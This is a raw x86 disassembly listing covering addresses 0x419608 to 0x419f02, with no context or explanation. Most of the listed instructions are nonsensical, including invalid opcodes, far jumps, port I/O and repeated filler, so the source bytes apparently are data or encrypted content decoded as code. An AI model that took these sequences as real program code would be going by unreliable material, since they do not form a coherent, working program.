  419608:	mov    BYTE PTR ds:0xf496064c,al
  41960e:	idiv   BYTE PTR ss:[ebp-0x21]
  419612:	xor    ah,dl
  419614:	cmp    eax,0x81f53c05
  419619:	repz stc 
  41961b:	xor    eax,0xe812e93d
  419620:	in     al,0x6f
  419622:	mov    bh,0x3
  419624:	xor    edx,ebp
  419626:	or     eax,0xc9
	...
  419637:	inc    esp
  419638:	jmp    0xfc2b:0xee41ccfc
  41963f:	test   DWORD PTR ds:0xea1103a1,eax
  419645:	or     eax,0xf8ea31d3
  41964a:	cli    
  41964b:	push   ss
  41964c:	out    0xd2,al
  41964e:	out    dx,al
  41964f:	inc    ecx
  419650:	retf   0xc2de
  419653:	pushf  
  419654:	outs   dx,DWORD PTR ds:[esi]
  419655:	sahf   
  419656:	add    esi,DWORD PTR [ecx]
  419658:	jmp    0xdeb9:0xdff8c4c5
  41965f:	sbb    ebp,edx
  419661:	mov    edi,0x9905ae03
  419666:	fdivp  st(7),st
  419668:	mov    edi,0xbbfedeb6
  41966d:	mov    edi,edx
  41966f:	and    eax,0xb1032305
  419674:	call   0xf9085506
  419679:	jnp    0x419647
  41967b:	shr    esp,0xab
  41967e:	sti    
  41967f:	test   DWORD PTR ds:0xe8910341,eax
  419685:	dec    DWORD PTR [ebp-0x779d0ae1]
  41968b:	cmp    al,0xe4
  41968d:	dec    eax
  41968e:	dec    esp
  41968f:	sub    BYTE PTR [eax],dh
  419691:	add    dh,al
  419693:	popa   
  419694:	shl    DWORD PTR [edx+0x4e],cl
  419697:	cs in  al,0x73
  41969a:	aaa    
	...
  4196ab:	(bad)  [edx+0x4c]
  4196ae:	(bad)  
  4196af:	idiv   BYTE PTR [esi]
  4196b1:	jmp    0x1b40df16
  4196b6:	adc    al,0xea
  4196b8:	inc    edx
  4196b9:	aas    
  4196ba:	cld    
  4196bb:	fist   DWORD PTR [ebp+0x8]
  4196be:	sti    
  4196bf:	repz bound ebp,QWORD PTR [eax]
  4196c2:	addr16 aas 
  4196c4:	(bad)  
  4196c5:	cmp    dh,BYTE PTR [ecx+ebp*8-0x1f53e6b4]
  4196cc:	inc    eax
  4196cd:	cld    
  4196ce:	into   
  4196cf:	hlt    
  4196d0:	bound  ecx,QWORD PTR [edi]
  4196d2:	mov    bl,0xd3
  4196d4:	jo     0x4196e2
  4196d6:	lods   eax,DWORD PTR ds:[esi]
  4196d7:	outs   dx,BYTE PTR ds:[esi]
  4196d8:	std    
  4196d9:	shl    BYTE PTR [ecx-0x38],cl
  4196dc:	(bad)  
  4196dd:	fst    QWORD PTR [ebp-0x55249d0b]
  4196e3:	iret   
  4196e4:	push   0xffffffcc
  4196e6:	mov    eax,ds:0xacc8fd6e
  4196eb:	clc    
  4196ec:	pop    esi
  4196ed:	mov    ecx,0xf323579
  4196f2:	sbb    edx,0x6b
  4196f5:	jmp    0x9a41ed5a
  4196fa:	js     0x4196df
  4196fc:	imul   edx,DWORD PTR [ebp-0x759d095b],0x4d
  419703:	repnz bound ebp,QWORD PTR [eax-0x7b980ba0]
  41970a:	inc    esp
  41970b:	fidiv  DWORD PTR [eax]
	...
  41971d:	or     BYTE PTR [esp+eiz*2],bl
  419720:	ins    BYTE PTR es:[edi],dx
  419721:	out    dx,al
  419722:	add    DWORD PTR [ebp+0x0],esi
  419725:	add    ebx,DWORD PTR [ecx+esi*2+0x65]
  419729:	test   al,0x5c
  41972b:	bound  esi,QWORD PTR [ecx+edi*2+0x73]
  41972f:	pop    esi
  419730:	arpl   WORD PTR [ecx+0x4b6c6f54],si
  419736:	or     DWORD PTR [edi+0x0],esi
  419739:	inc    ebx
  41973a:	addr16 jno 0x4197a2
  41973d:	dec    eax
  41973e:	bound  esi,QWORD PTR [si+0x49]
  419742:	jae    0x4197a6
  419744:	popa   
  419745:	ss fs push edx
  419748:	jb     0x419778
  41974a:	dec    eax
  41974b:	std    
  41974c:	inc    DWORD PTR [ebp+0x60]
  41974f:	imul   ebp,DWORD PTR [ecx+0x6c],0x64
  419753:	jno    0x419783
  419755:	pop    bp
  419757:	imul   eax,DWORD PTR [eax],0x744f08af
  41975d:	enter  0x7152,0x72
  419761:	jae    0x4197ab
  419763:	std    
  419764:	dec    edx
  419766:	or     BYTE PTR [edi+0x74],cl
  419769:	test   al,0x53
  41976b:	inc    eax
  41976c:	push   0x3e4088
  419771:	xchg   esi,eax
  419772:	or     BYTE PTR [edi+0x74],cl
  419775:	mov    eax,0xcc496c3d
  41977a:	pop    ebp
  41977b:	add    BYTE PTR ds:[esi+0x744f08],cl
	...
  41978e:	add    BYTE PTR [eax],al
  419790:	mov    eax,0xcb727152
  419795:	add    edx,ebp
  419797:	add    cl,cl
  419799:	pop    ebp
  41979a:	outs   dx,DWORD PTR ds:[esi]
  41979b:	inc    ebx
  41979c:	iret   
  41979d:	jno    0x4197ea
  41979f:	dec    ecx
  4197a0:	or     ecx,DWORD PTR [ecx]
  4197a2:	push   cs
  4197a3:	add    DWORD PTR [ebx-0x51],esp
  4197a6:	in     eax,dx
  4197a7:	jno    0x419759
  4197a9:	xchg   edx,eax
  4197aa:	out    dx,eax
  4197ab:	inc    esi
  4197ac:	lods   al,BYTE PTR ds:[esi]
  4197ad:	pop    esi
  4197ae:	add    DWORD PTR [ecx-0x35],esi
  4197b1:	jp     0x4197a1
  4197b3:	pop    esi
  4197b4:	mov    bl,0x85
  4197b6:	and    esp,DWORD PTR [edi+edi*4-0x16]
  4197ba:	add    BYTE PTR [esi],dh
  4197bc:	arpl   bp,dx
  4197be:	in     eax,0x62
  4197c0:	xchg   edi,eax
  4197c1:	sub    esp,ebx
  4197c3:	arpl   WORD PTR [edi-0x30],di
  4197c6:	add    ebp,DWORD PTR [edx]
  4197c8:	arpl   bx,ax
  4197ca:	fidiv  WORD PTR [ebx+0x7b]
  4197cd:	shl    eax,cl
  4197cf:	jae    0x419752
  4197d1:	vdivpd ymm0,ymm3,YMMWORD PTR [esi+0x634703b9]
  4197d9:	das    
  4197da:	in     eax,0x60
  4197dc:	js     0x4197d7
  4197de:	out    dx,eax
  4197df:	(bad)  
  4197e0:	fadd   QWORD PTR [ebx+0x1]
  4197e3:	popa   
  4197e4:	inc    esp
  4197e5:	add    al,0xe6
  4197e7:	bound  eax,QWORD PTR [eax+0x12]
  4197ea:	add    al,0x26
  4197ec:	arpl   di,di
  4197ee:	out    0x6c,eax
  4197f0:	xor    BYTE PTR [ecx],al
  4197f2:	icebp  
  4197f3:	ins    BYTE PTR es:[edi],dx
	...
  419800:	add    BYTE PTR [eax],al
  419802:	add    BYTE PTR [eax+0x7],al
  419805:	fbstp  TBYTE PTR [ebx+0x63]
  419808:	and    al,BYTE PTR [ecx+esi*2]
  41980b:	ds push esp
  41980d:	(bad)  
  41980f:	pushf  
  419810:	lahf   
  419811:	add    DWORD PTR [ecx-0x2],esi
  419814:	inc    ecx
  419815:	loopne 0x419877
  419817:	pop    ss
  419818:	pop    esi
  419819:	add    DWORD PTR [esi],edi
  41981b:	arpl   WORD PTR [eax+0x5df560e0],si
  419821:	add    DWORD PTR [ebp+0x63],eax
  419824:	scas   eax,DWORD PTR es:[edi]
  419825:	loopne 0x41989a
  419827:	lock stos BYTE PTR es:[edi],al
  419829:	loop   0x419893
  41982b:	hlt    
  41982c:	add    al,0x97
  41982e:	out    dx,eax
  41982f:	pop    esp
  419830:	ins    BYTE PTR es:[edi],dx
  419831:	enter  0xae03,0xd8
  419835:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419836:	rcl    al,cl
  419838:	out    0x98,al
  41983a:	out    dx,eax
  41983b:	shl    ebp,1
  41983d:	out    0x3,al
  41983f:	mov    dh,0xf8
  419841:	(bad)  
  419842:	loop   0x41980f
  419844:	cmp    BYTE PTR [ecx+0x7ad9c725],bh
  41984a:	add    ebx,DWORD PTR [eax-0x421accfb]
  419850:	loope  0x419885
  419852:	icebp  
  419853:	xor    edi,0xe37ff236
  419859:	aas    
  41985a:	call   0x4285ee0
  41985f:	pushf  
  419860:	add    eax,0xdc88e614
  419865:	inc    edi
  419866:	loopne 0x419868
	...
  419874:	add    BYTE PTR [eax],al
  419876:	xchg   ecx,eax
  419877:	clc    
  419878:	inc    ebx
  419879:	repnz xchg esp,eax
  41987b:	not    DWORD PTR ds:0x3d945de
  419881:	add    al,0x50
  419883:	clc    
  419884:	or     esi,edx
  419886:	inc    ecx
  419887:	fist   DWORD PTR [esi+eiz*1]
  41988a:	aas    
  41988b:	fst    DWORD PTR [edx]
  41988d:	add    al,0x63
  41988f:	add    eax,0x56303e7
  419894:	out    0x3,eax
  419896:	arpl   WORD PTR ds:0x56303e7,ax
  41989c:	out    0x3,eax
  41989e:	arpl   WORD PTR ds:0x56303e7,ax
  4198a4:	out    0x3,eax
  4198a6:	arpl   WORD PTR ds:0x56303e7,ax
  4198ac:	out    0x3,eax
  4198ae:	arpl   WORD PTR ds:0x56303e7,ax
  4198b4:	add    cl,ch
  4198b6:	pusha  
  4198b7:	add    eax,0x560e900
  4198bc:	add    cl,ch
  4198be:	pusha  
  4198bf:	add    eax,0x560e900
  4198c4:	add    cl,ch
  4198c6:	pusha  
  4198c7:	add    eax,0x560e900
  4198cc:	add    cl,ch
  4198ce:	pusha  
  4198cf:	add    eax,0x560e900
  4198d4:	add    cl,ch
  4198d6:	pusha  
  4198d7:	add    eax,0xe900
	...
  4198e8:	add    BYTE PTR [eax+0x5],ah
  4198eb:	add    cl,ch
  4198ed:	pusha  
  4198ee:	add    eax,0x560e900
  4198f3:	add    cl,ch
  4198f5:	pusha  
  4198f6:	add    eax,0x560e900
  4198fb:	add    cl,ch
  4198fd:	pusha  
  4198fe:	add    eax,0x560e900
  419903:	add    cl,ch
  419905:	pusha  
  419906:	add    eax,0x560e900
  41990b:	add    cl,ch
  41990d:	pusha  
  41990e:	add    eax,0x560e900
  419913:	add    cl,ch
  419915:	pusha  
  419916:	add    eax,0x560e900
  41991b:	add    cl,ch
  41991d:	pusha  
  41991e:	add    eax,0x560e900
  419923:	add    cl,ch
  419925:	pusha  
  419926:	add    eax,0x560e900
  41992b:	add    cl,ch
  41992d:	pusha  
  41992e:	add    eax,0x560e900
  419933:	add    cl,ch
  419935:	pusha  
  419936:	add    eax,0x560e900
  41993b:	add    BYTE PTR [eax],al
  41993d:	mov    al,BYTE PTR [esi]
  41993f:	add    BYTE PTR [eax],al
  419941:	mov    al,BYTE PTR [esi]
  419943:	add    BYTE PTR [eax],al
  419945:	jp     0x41994d
  419947:	add    BYTE PTR [eax],al
  419949:	jp     0x419951
	...
  41995b:	add    BYTE PTR [edx+0x6],cl
  41995e:	add    BYTE PTR [eax],al
  419960:	dec    edx
  419961:	push   es
  419962:	add    BYTE PTR [eax],al
  419964:	pop    ds
  419965:	cmp    esp,ecx
  419967:	int3   
  419968:	pop    ss
  419969:	cmp    esp,ecx
  41996b:	int3   
  41996c:	xchg   esi,eax
  41996d:	jle    0x41995b
  41996f:	push   ecx
  419970:	call   0x5bcba134
  419975:	jge    0x4199c2
  419977:	(bad)  
  419978:	fcomp  DWORD PTR [edi+0x5b]
  41997b:	ret    
  41997c:	mov    dh,0x7e
  41997e:	in     al,dx
  41997f:	push   ecx
  419980:	lods   eax,DWORD PTR ds:[esi]
  419981:	shl    BYTE PTR [eax],cl
  419983:	leave  
  419984:	xchg   DWORD PTR [esi+0x6f],edi
  419987:	xor    al,bl
  419989:	repnz or ecx,DWORD PTR [ebx+0x46890975]
  419990:	imul   edi,DWORD PTR [ebx+eax*2-0x4],0xffffffd8
  419995:	jmp    0x6b3d:0x852d8b1f
  41999c:	push   edi
  41999d:	add    al,BYTE PTR [eax+0x1f1283f]
  4199a3:	jmp    0x41995f
  4199a5:	leave  
  4199a6:	pop    ebp
  4199a7:	mov    edi,DWORD PTR [esi+0x16ccc0c7]
  4199ad:	jle    0x41999b
  4199af:	add    edi,0x20
  4199b2:	mov    DWORD PTR [ebp+0x5b],eax
  4199b5:	jl     0x4199fa
  4199b7:	loopne 0x419991
  4199b9:	mov    bh,0xdf
  4199bb:	mov    esi,DWORD PTR [esi]
  4199bd:	add    DWORD PTR gs:[ecx+0x0],edx
	...
  4199cd:	add    BYTE PTR [eax],al
  4199cf:	push   edi
  4199d0:	jl     0x419a25
  4199d2:	in     al,0xd8
  4199d4:	mov    edi,0xed1b8be3
  4199d9:	add    BYTE PTR [ebp+0x6b],cl
  4199dc:	jl     0x419a29
  4199de:	clc    
  4199df:	call   0x21cd91b3
  4199e4:	and    DWORD PTR [ecx],eax
  4199e6:	inc    ebp
  4199e7:	pop    ebx
  4199e8:	jl     0x419a2d
  4199ea:	call   0x8c3954d7
  4199ef:	mov    dl,0x25
  4199f1:	add    DWORD PTR [ebp+0x5b],edx
  4199f4:	jle    0x419a49
  4199f6:	lock fadd st,st(2)
  4199f9:	test   DWORD PTR [ebx+0x4d0109ab],0xfc4b7e6b
  419a03:	and    al,0xc3
  419a05:	repz add BYTE PTR [ebx+0x5],ah
  419a09:	add    bl,ch
  419a0b:	push   0x7c
  419a0d:	push   ebx
  419a0e:	hlt    
  419a0f:	loopne 0x419a54
  419a11:	dec    DWORD PTR [eax+0x458971b6]
  419a17:	or     edi,DWORD PTR [ebp+0x4b]
  419a1a:	hlt    
  419a1b:	cmp    BYTE PTR [ebp+0x7cab7317],bh
  419a21:	push   ebx
  419a22:	lock fadd DWORD PTR [ebx]
  419a25:	add    DWORD PTR [ebp+0x5b],eax
  419a28:	jle    0x419a6d
  419a2a:	fmul   QWORD PTR [ecx-0x9]
  419a2d:	lods   al,BYTE PTR ds:[si]
  419a2f:	popa   
  419a30:	(bad)  
	...
  419a3f:	add    BYTE PTR [eax],al
  419a41:	add    BYTE PTR [esi],bl
  419a43:	dec    ecx
  419a44:	dec    edi
  419a45:	call   0x41a07d
  419a4a:	loopne 0x419a8d
  419a4c:	or     al,0x85
  419a4e:	mov    ds:0x168b18f2,eax
  419a53:	jno    0x4199de
  419a55:	inc    ebp
  419a56:	mov    ebx,0x330cb4f8
  419a5b:	jle    0x419aa8
  419a5d:	in     al,dx
  419a5e:	call   0x26cd8635
  419a63:	imul   ecx,DWORD PTR [ecx+0x4304f304],0x88fa8808
  419a6d:	dec    ebp
  419a6e:	jae    0x4199f4
  419a70:	mov    edi,0xefbada04
  419a75:	jmp    0x419a36
  419a77:	xor    al,0xc0
  419a79:	mov    eax,DWORD PTR [esi-0x36]
  419a7c:	ror    ah,0x27
  419a7f:	cmp    esp,ecx
  419a81:	int3   
  419a82:	pop    ds
  419a83:	cmp    esp,ecx
  419a85:	int3   
  419a86:	pop    ss
  419a87:	cmp    esp,ecx
  419a89:	int3   
  419a8a:	xchg   esi,eax
  419a8b:	jl     0x419a79
  419a8d:	add    DWORD PTR [edi+0xd],0xffffffe8
  419a91:	add    eax,0x89fd682c
  419a96:	sahf   
  419a97:	pop    ebp
  419a98:	mov    DWORD PTR [ebp+0xb],eax
  419a9b:	aad    0xe7
  419a9d:	sub    DWORD PTR [eax+ebp*2],edx
  419aa0:	std    
  419aa1:	and    DWORD PTR [edi],0x1
  419aa4:	mov    eax,ds:0xb4
	...
  419ab5:	scas   al,BYTE PTR es:[edi]
  419ab6:	(bad)  
  419ab7:	jmp    DWORD PTR [edi-0x41]
  419aba:	add    al,BYTE PTR [eax+0x0]
  419abd:	call   0xec93827b
  419ac2:	adc    DWORD PTR [ebp+edx*2-0x475efa5e],esi
  419ac9:	ss (bad) 
  419acb:	jmp    FWORD PTR [ecx+0x63]
  419ace:	(bad)  
  419ad0:	addr16 lahf 
  419ad2:	add    al,BYTE PTR [eax+0x0]
  419ad5:	les    edx,FWORD PTR [ecx]
  419ad7:	mov    eax,0x87052255
  419adc:	inc    ebp
  419add:	retf   
  419ade:	aas    
  419adf:	inc    ebx
  419ae0:	cld    
  419ae1:	arpl   WORD PTR ds:0xfdb80000,ax
  419ae7:	mov    BYTE PTR [ebp-0x61],dl
  419aea:	add    edx,0x1
  419aed:	jmp    0x869:0xe83fbd1
  419af4:	jae    0x419b38
  419af6:	jl     0x419b3b
  419af8:	cld    
  419af9:	call   0x61ce1df6
  419afe:	vmovmskps ebx,ymm0
  419b02:	shl    edi,1
  419b04:	push   edx
  419b05:	adc    DWORD PTR fs:[ebp+edx*2+0x4d8905a2],esi
  419b0d:	push   edi
  419b0e:	jge    0x419b14
  419b10:	lea    edx,[edi]
  419b12:	sar    DWORD PTR [esi],1
  419b14:	add    BYTE PTR [eax],bh
  419b16:	push   esi
  419b17:	mov    ebp,esp
	...
  419b25:	add    BYTE PTR [eax],al
  419b27:	add    BYTE PTR [esi+0x27cccc42],bl
  419b2d:	cmp    cl,ah
  419b2f:	int3   
  419b30:	pop    ds
  419b31:	cmp    cl,ah
  419b33:	int3   
  419b34:	pop    ss
  419b35:	cmp    cl,ah
  419b37:	int3   
  419b38:	mov    dh,0x7a
  419b3a:	in     al,dx
  419b3b:	mov    eax,ds:0x3ecf73
  419b40:	dec    ebp
  419b41:	jp     0x419b83
  419b43:	xor    al,bl
  419b45:	mov    eax,0xbdea3e07
  419b4a:	pop    es
  419b4b:	pop    ebp
  419b4c:	and    BYTE PTR [edx],bh
  419b4e:	int3   
  419b4f:	int3   
  419b50:	pop    ds
  419b51:	cmp    cl,ah
  419b53:	int3   
  419b54:	pop    ss
  419b55:	cmp    cl,ah
  419b57:	int3   
  419b58:	ss jp  0x419b47
  419b5b:	mov    ebx,DWORD PTR [esi]
  419b5d:	stc    
  419b5e:	dec    edi
  419b5f:	mov    ebx,DWORD PTR [esi]
  419b61:	std    
  419b62:	dec    esi
  419b63:	jmp    FWORD PTR [esi-0x4f]
  419b66:	push   ebx
  419b67:	inc    ecx
  419b68:	arpl   ax,cx
  419b6a:	ror    ah,0xa7
  419b6d:	cmp    esp,ecx
  419b6f:	int3   
  419b70:	lahf   
  419b71:	cmp    esp,ecx
  419b73:	int3   
  419b74:	xchg   edi,eax
  419b75:	cmp    esp,ecx
  419b77:	int3   
  419b78:	ss jp  0x419b67
  419b7b:	add    DWORD PTR [edi-0x6ff9603],0x4
  419b82:	push   0xffc561dc
  419b87:	(bad)  
  419b88:	push   esi
  419b89:	lods   eax,DWORD PTR ds:[esi]
  419b8a:	push   ebx
  419b8b:	inc    ecx
	...
  419b98:	add    BYTE PTR [eax],al
  419b9a:	add    BYTE PTR [ebx+0x7c],ah
  419b9d:	inc    ebx
  419b9e:	clc    
  419b9f:	sti    
  419ba0:	pop    esp
  419ba1:	add    al,BYTE PTR [eax+0x63]
  419ba4:	jp     0x419be9
  419ba6:	clc    
  419ba7:	mov    bl,0x5d
  419ba9:	mov    edx,0x816654ff
  419bae:	les    ebx,FWORD PTR [ebx+0x7c]
  419bb1:	inc    ebx
  419bb2:	cld    
  419bb3:	fdiv   DWORD PTR [edi-0x3017aef1]
  419bb9:	or     edx,DWORD PTR [edx-0x18]
  419bbc:	mov    edi,0xd02c5007
  419bc1:	sti    
  419bc2:	mov    edi,DWORD PTR [esi]
  419bc4:	enter  0xccc0,0xb6
  419bc8:	jp     0x419bb6
  419bca:	push   ecx
  419bcb:	sbb    al,0xc0
  419bcd:	sti    
  419bce:	add    BYTE PTR [ebx+0x5],ah
  419bd1:	add    bl,ch
  419bd3:	pop    edx
  419bd4:	jp     0x419c19
  419bd6:	cld    
  419bd7:	loopne 0x419c1d
  419bd9:	dec    DWORD PTR [eax+0x4d89699e]
  419bdf:	out    dx,eax
  419be0:	sub    DWORD PTR [ebx+0x10],ecx
  419be3:	jo     0x419beb
  419be5:	mov    DWORD PTR [ebp+0x6b],edx
  419be8:	add    dl,BYTE PTR [ebx-0x4]
  419beb:	fs scas eax,DWORD PTR es:[edi]
  419bed:	add    cl,BYTE PTR [ebx+0x4d00f91e]
  419bf3:	(bad)  
  419bf4:	cmc    
  419bf5:	mov    ch,0x11
  419bf7:	js     0x419c3c
  419bf9:	je     0x419c02
  419bfb:	sti    
  419bfc:	add    eax,DWORD PTR [eax]
	...
  419c0e:	arpl   WORD PTR [edx+0x4],bx
  419c11:	jmp    0x419ba6
  419c13:	xor    eax,eax
  419c15:	mov    eax,DWORD PTR [esi-0x58333f39]
  419c1b:	cmp    ah,cl
  419c1d:	int3   
  419c1e:	lahf   
  419c1f:	cmp    ah,cl
  419c21:	int3   
  419c22:	xchg   edi,eax
  419c23:	cmp    ah,cl
  419c25:	int3   
  419c26:	push   ss
  419c27:	jp     0x419c15
  419c29:	mov    ecx,0x55b
  419c2e:	pop    es
  419c2f:	jp     0x419c38
  419c31:	mov    DWORD PTR [esi+0x15],edx
  419c34:	push   esi
  419c35:	inc    ecx
  419c36:	arpl   dx,ax
  419c38:	ror    ah,0x27
  419c3b:	push   edx
  419c3c:	int3   
  419c3d:	int3   
  419c3e:	pop    ds
  419c3f:	push   edx
  419c40:	int3   
  419c41:	int3   
  419c42:	pop    ss
  419c43:	push   edx
  419c44:	int3   
  419c45:	int3   
  419c46:	xchg   esi,eax
  419c47:	nop
  419c48:	in     al,dx
  419c49:	add    DWORD PTR [edi-0xa],0xffffff88
  419c4d:	inc    ebp
  419c4e:	pop    ebx
  419c4f:	mov    BYTE PTR [eax+0x4],bh
  419c52:	arpl   WORD PTR [esp+eax*4],dx
  419c55:	mov    BYTE PTR [ebx+0x5],ah
  419c58:	add    BYTE PTR [ebx+0x51890da6],cl
  419c5e:	addr16 mov dl,ch
  419c61:	or     BYTE PTR [edx],dh
  419c63:	jo     0x419bec
  419c65:	push   ebp
  419c66:	not    DWORD PTR [eax+0x45e00843]
  419c6c:	or     BYTE PTR [ecx+0x45c555a6],cl
	...
  419c7e:	add    BYTE PTR [eax],al
  419c80:	add    bh,ah
  419c82:	add    eax,0x70630000
  419c87:	pop    es
  419c88:	mov    esp,DWORD PTR [esi]
  419c8a:	popa   
  419c8b:	add    ecx,0xfc4b8e62
  419c91:	fdivr  DWORD PTR [edx+0x59163bfb]
  419c97:	jno    0x419cdf
  419c99:	call   0x1ecd9868
  419c9e:	push   ebp
  419c9f:	or     eax,0xbec64fb7
  419ca4:	cli    
  419ca5:	outs   dx,DWORD PTR ds:[esi]
  419ca6:	mov    dl,bh
  419ca8:	add    ecx,DWORD PTR [esi]
  419caa:	pop    ss
  419cab:	mov    DWORD PTR [ebp-0x71],eax
  419cae:	nop
  419caf:	dec    ebx
  419cb0:	lock push esp
  419cb2:	pushf  
  419cb3:	adc    al,0x41
  419cb5:	loop   0x419d1e
  419cb7:	std    
  419cb8:	packsswb mm0,QWORD PTR ds:0x906b5587
  419cbf:	inc    ebx
  419cc0:	or     al,bl
  419cc2:	ror    BYTE PTR [ebx],cl
  419cc4:	add    ebp,DWORD PTR [ebx-0x70]
  419cc7:	push   ebx
  419cc8:	clc    
  419cc9:	call   0xa644abd6
  419cce:	cmc    
  419ccf:	mov    BYTE PTR [ebp+0x5b],cl
  419cd2:	nop
  419cd3:	push   ebx
  419cd4:	or     al,0x60
  419cd6:	test   BYTE PTR [eax+0x48e3b4d],0xa
  419cdd:	cmp    BYTE PTR [esi-0x6fa4aa77],ch
  419ce3:	inc    ebx
  419ce4:	or     BYTE PTR [eax],al
	...
  419cf2:	add    BYTE PTR [eax],al
  419cf4:	pusha  
  419cf5:	mov    DWORD PTR [ebx],0xe70d9e89
  419cfb:	imul   ecx,DWORD PTR [esp+eiz*2],0xfffffffd
  419cff:	mov    edi,esi
  419d01:	rol    eax,0xcc
  419d04:	xchg   esi,eax
  419d05:	nop
  419d06:	in     al,dx
  419d07:	add    DWORD PTR [edi],0x29
  419d0a:	mov    DWORD PTR [ebp+0x5b],eax
  419d0d:	mov    es,WORD PTR [ebx-0x1c]
  419d10:	fcom   st(1)
  419d12:	jecxz  0x419c9f
  419d14:	imul   eax,DWORD PTR ss:[ecx],0x538e9751
  419d1b:	call   0x8c2966f8
  419d20:	fild   DWORD PTR [eax+eax*1+0x4b8e6300]
  419d27:	lock loopne 0x419d0b
  419d2a:	out    dx,eax
  419d2b:	add    BYTE PTR [ecx+ecx*4-0x7],bl
  419d2f:	add    BYTE PTR [ebx+0x5],ah
  419d32:	mov    DWORD PTR [ebp+0x6b],edx
  419d35:	or     BYTE PTR [ebx-0x10],dl
  419d38:	jmp    0x8165:0x268bdfb9
  419d3f:	js     0x419db4
  419d41:	add    eax,0x486840d
  419d46:	add    BYTE PTR [eax],al
  419d48:	or     DWORD PTR ds:0xd1d8006a,eax
  419d4e:	fisttp WORD PTR [ebx+0x51010d0e]
  419d54:	outs   dx,DWORD PTR ds:[esi]
  419d55:	mov    bh,0xfc
  419d57:	adc    eax,0x0
	...
  419d64:	add    BYTE PTR [eax],al
  419d66:	add    BYTE PTR [ebx],bl
  419d68:	mov    ecx,0xc8da003e
  419d6d:	sti    
  419d6e:	mov    ebx,DWORD PTR [esi+0x63388165]
  419d74:	fst    DWORD PTR [esi]
  419d76:	mov    esp,DWORD PTR [esi+0x5b558965]
  419d7c:	push   es
  419d7d:	jns    0x45cb0f11
  419d83:	add    ecx,DWORD PTR [edi-0x329ff7b5]
  419d89:	jns    0x182af72d
  419d8f:	fdivr  DWORD PTR [eax+0xda68bdf]
  419d95:	add    DWORD PTR [edx+0x53],eax
  419d98:	mov    WORD PTR [ebx-0xc],es
  419d9b:	fcom   st(0)
  419d9d:	fisttp WORD PTR [ebx+0x11010d8e]
  419da3:	jmp    0x5d:0x1ec7ebb8
  419daa:	add    BYTE PTR [ebx+0x5],ah
  419dad:	mov    DWORD PTR [ebp-0x3d],eax
  419db0:	xchg   BYTE PTR [eax+0x10],bh
  419db3:	arpl   cx,bx
  419db5:	or     al,0x8b
  419db7:	es cmp DWORD PTR gs:[ecx],0xc704d963
  419dbf:	push   ds
  419dc0:	pop    ebp
  419dc1:	(bad)  
  419dc2:	jmp    DWORD PTR [ebx+0x5]
  419dc5:	mov    DWORD PTR [ebp-0x71],edx
  419dc8:	xchg   BYTE PTR [edx],bh
	...
  419dda:	pop    ss
  419ddb:	in     al,0x88
  419ddd:	inc    ebp
  419dde:	(bad)  
  419ddf:	mov    cs,WORD PTR [eax]
  419de1:	add    DWORD PTR [edx-0x1cfffffb],0x168b1bd9
  419deb:	pop    ecx
  419dec:	mov    DWORD PTR [edx],eax
  419dee:	ds (bad) 
  419df0:	std    
  419df1:	(bad)  
  419df2:	fdiv   QWORD PTR [ebp-0x4ba8b278]
  419df8:	out    0xb5,eax
  419dfa:	dec    esi
  419dfb:	(bad)  
  419dfc:	std    
  419dfd:	sbb    DWORD PTR [edi],0xd
  419e00:	xchg   DWORD PTR [ebp+0x1f],eax
  419e03:	outs   dx,BYTE PTR ds:[esi]
  419e04:	sbb    al,0x8b
  419e06:	mov    ds,WORD PTR [ecx-0x77]
  419e09:	add    bl,al
  419e0b:	iret   
  419e0c:	pop    es
  419e0d:	lea    ecx,[edi-0x17adfdf3]
  419e13:	(bad)  
  419e14:	sti    
  419e15:	push   eax
  419e16:	or     edi,DWORD PTR [edx-0x5]
  419e19:	dec    DWORD PTR [esi+eax*4]
  419e1c:	les    ecx,FWORD PTR [eax]
  419e1e:	fcmovb st,st(7)
  419e20:	fisttp DWORD PTR [ebx+0x558959ae]
  419e26:	pop    ss
  419e27:	mov    WORD PTR [edi],cs
  419e29:	mov    esp,DWORD PTR [esi+0x5fc08159]
  419e2f:	mov    WORD PTR [ebx-0xc],es
  419e32:	call   0xa2c58a06
  419e37:	or     BYTE PTR [edi-0x6a9240b3],al
  419e3d:	mov    eax,DWORD PTR [eax]
	...
  419e4b:	add    BYTE PTR [eax],al
  419e4d:	cs gs add edx,0xe0538c57
  419e55:	retf   0xfd12
  419e58:	jmp    FWORD PTR [ebp+ecx*4+0x50a05de3]
  419e5f:	int3   
  419e60:	int3   
  419e61:	ss mov gs,esp
  419e64:	add    DWORD PTR [edi+0x61f0680c],0xffffffc5
  419e6b:	(bad)  
  419e6c:	(bad)  
  419e6d:	outs   dx,BYTE PTR ds:[esi]
  419e6e:	inc    ebp
  419e6f:	push   ebx
  419e70:	inc    ecx
  419e71:	arpl   WORD PTR [ebx+eax*2+0x2610bf8],cx
  419e78:	inc    eax
  419e79:	arpl   WORD PTR [esi+0x6d13f843],cx
  419e7f:	ds std 
  419e81:	pop    esp
  419e82:	popa   
  419e83:	add    esp,0xfc438e6b
  419e89:	fcom   st(2)
  419e8b:	sqrtps xmm3,xmm0
  419e8e:	mov    edx,0xcae8520b
  419e93:	pop    es
  419e94:	push   eax
  419e95:	xor    al,0xbb
  419e97:	sti    
  419e98:	mov    eax,DWORD PTR [esi-0x3d]
  419e9b:	ror    ah,0x17
  419e9e:	push   edx
  419e9f:	int3   
  419ea0:	int3   
  419ea1:	mov    dh,0x8c
  419ea3:	in     al,dx
  419ea4:	mov    eax,ds:0x3eb777
  419ea9:	and    eax,0x6e8b6806
  419eae:	stc    
  419eaf:	push   ebp
  419eb0:	inc    ecx
	...
  419ebd:	add    BYTE PTR [eax],al
  419ebf:	add    BYTE PTR [ebx-0x72],ah
  419ec2:	push   eax
  419ec3:	add    DWORD PTR [ecx+0x66508844],esi
  419ec9:	ret    0xccc0
  419ecc:	pop    ss
  419ecd:	push   edx
  419ece:	int3   
  419ecf:	int3   
  419ed0:	ss mov esp,gs
  419ed3:	add    edi,0x11
  419ed6:	lahf   
  419ed7:	adc    BYTE PTR ds:0xb18affc6,dh
  419edd:	adc    al,0xc7
  419edf:	ds call 0x91ccceaa
  419ee5:	mov    edx,ss
  419ee7:	ds fmul st,st(5)
  419eea:	or     ecx,DWORD PTR [ebx-0xbb4716f]
  419ef0:	call   0x2bcd92bf
  419ef5:	adc    DWORD PTR [edi+0x538c8b4d],eax
  419efb:	clc    
  419efc:	fidivr DWORD PTR [edx+0x562b8fb]
  419f02:	add    BYTE PTR [eax],al
